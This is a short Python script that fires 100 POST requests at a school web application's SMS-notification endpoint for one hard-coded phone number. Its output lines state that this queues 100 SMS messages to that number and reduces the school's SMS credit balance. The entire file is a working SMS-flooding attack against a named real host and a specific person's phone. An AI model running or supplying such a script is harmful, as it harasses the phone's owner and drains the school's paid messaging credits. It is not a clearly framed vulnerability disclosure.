import requests
import time

TARGET_URL = "https://app-acfi.essentiel.ph/student/notify_individual_student"
TARGET_PHONE = "09943788338"
COUNT = 100
DELAY = 0.5  # seconds between requests

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
}

for i in range(COUNT):
    resp = requests.post(TARGET_URL, data={"phone": TARGET_PHONE}, headers=headers)
    print(f"[{i+1}/{COUNT}] Status: {resp.status_code} | Body: {resp.text[:600]}")
    time.sleep(DELAY)

print(f"\nDone. {COUNT} SMS messages queued to {TARGET_PHONE}")
print("School's SMS credit balance reduced by same amount.")
